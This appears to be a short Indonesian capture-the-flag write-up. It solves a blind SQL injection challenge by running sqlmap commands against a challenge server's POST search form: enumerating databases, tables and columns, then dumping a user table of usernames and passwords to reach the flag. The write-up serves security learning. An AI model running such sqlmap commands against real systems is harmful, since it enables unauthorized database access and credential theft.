# Are you blind yes maybe

diberikan sebuah web berisi sebuah inputan <br>
diketahui bahwa terdapat celah sqli injection pada form tersebut dengan method POST <br>
dicoba dengan melakukan blind Sql Injection menggunakan sqlmap 

``` sqlmap -u "http://202.43.92.132:40001/index.php" --data="search=*&form=submit" --method POST --dbs ``` <br>

didapat sebuah database bernama sql, kita coba temukan tabelnya<br>
```  sqlmap -u "http://202.43.92.132:40001/index.php" --data="search=*&form=submit" --method POST  --tables -D \`sql\` ``` <br>

didapat sebuah tabel 'user', coba cek kolom terlebih dahulu.<br>
```  sqlmap -u "http://202.43.92.132:40001/index.php" --data="search=*&form=submit" --method POST  --columns -D \`sql\` -T user ``` <br>


didapat kolom yang mencurigakan berisi username dan pasword, langsung saja lakukan dump <br>
``` sqlmap -u http://202.43.92.132:40001/index.php --data="search=s&form=submit" --method POST --dump -D \`sql\` -T user ```<br>

<img src="sqlmap.jpg"><br>

**ASGama{L00k1ng_f0R_s0m3_fl4g?}**
